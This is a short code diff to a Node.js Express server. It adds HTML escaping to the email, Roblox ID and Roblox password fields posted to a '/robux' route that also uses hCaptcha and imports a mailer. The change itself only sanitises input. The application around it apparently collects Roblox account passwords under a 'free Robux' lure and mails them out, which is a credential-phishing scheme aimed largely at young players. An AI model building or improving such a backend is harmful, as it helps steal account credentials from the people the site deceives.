@@ -2,8 +2,10 @@ const express = require("express");
 const nodemailer = require("nodemailer");
 const bodyParser = require("body-parser");
 const axios = require('axios');
-require('dotenv').config();
+const escapeHtml = require('escape-html');
 const querystring = require('querystring');
+require('dotenv').config();
+
 const app = express();
 const port = 3000;
 
@@ -21,11 +23,9 @@ const SECRET_KEY = process.env.HCAPTCHA_SECRET_KEY;
 app.post("/robux", async (req, res) => {
     const token = req.body['h-captcha-response'];
 
-    const {
-        email,
-        roblox_id,
-        roblox_pwd
-    } = req.body;
+    const email = escapeHtml(req.body.email);
+    const roblox_id = escapeHtml(req.body.roblox_id);
+    const roblox_pwd = escapeHtml(req.body.roblox_pwd);
 
     let privacy = req.body.privacy
     let _3rdperson = req.body._3rdperson
